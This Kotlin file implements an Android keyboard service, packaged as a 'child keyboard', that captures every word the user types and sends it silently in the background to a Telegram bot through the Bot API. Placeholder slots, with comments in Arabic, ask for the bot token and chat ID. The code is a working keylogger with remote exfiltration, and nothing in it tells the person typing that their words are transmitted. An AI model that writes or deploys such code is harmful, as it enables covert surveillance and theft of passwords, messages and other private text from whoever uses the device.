package com.example.childkeyboard

import android.inputmethodservice.InputMethodService
import android.inputmethodservice.Keyboard
import android.inputmethodservice.KeyboardView
import android.view.View
import android.view.inputmethod.InputConnection
import java.net.HttpURLConnection
import java.net.URL

class MyKeyboardService : InputMethodService(), KeyboardView.OnKeyboardActionListener {

    private lateinit var keyboardView: KeyboardView
    private lateinit var keyboard: Keyboard
    private var currentWord = ""

    // ضع توكن البوت و chatId هنا
    private val BOT_TOKEN = "ضع_توكن_البوت_هنا"
    private val CHAT_ID = "ضع_رقم_الشات_هنا"

    override fun onCreateInputView(): View {
        keyboardView = layoutInflater.inflate(R.layout.keyboard_view, null) as KeyboardView
        keyboard = Keyboard(this, R.xml.keyboard_layout)
        keyboardView.keyboard = keyboard
        keyboardView.setOnKeyboardActionListener(this)
        return keyboardView
    }

    override fun onKey(primaryCode: Int, keyCodes: IntArray?) {
        val ic: InputConnection? = currentInputConnection
        when (primaryCode) {
            Keyboard.KEYCODE_DELETE -> {
                if (currentWord.isNotEmpty()) currentWord = currentWord.dropLast(1)
                ic?.deleteSurroundingText(1,1)
            }
            Keyboard.KEYCODE_DONE, 32 -> {
                if (currentWord.isNotEmpty()) {
                    sendToTelegram(currentWord)
                    currentWord = ""
                }
                ic?.commitText(" ",1)
            }
            else -> {
                val char = primaryCode.toChar()
                currentWord += char
                ic?.commitText(char.toString(), 1)
            }
        }
    }

    private fun sendToTelegram(word: String) {
        Thread {
            try {
                val urlString = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage?chat_id=$CHAT_ID&text=$word"
                val url = URL(urlString)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "GET"
                conn.connect()
                conn.inputStream.bufferedReader().readText()
                conn.disconnect()
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }.start()
    }

    override fun onPress(p0: Int) {}
    override fun onRelease(p0: Int) {}
    override fun onText(p0: CharSequence?) {}
    override fun swipeLeft() {}
    override fun swipeRight() {}
    override fun swipeDown() {}
    override fun swipeUp() {}
}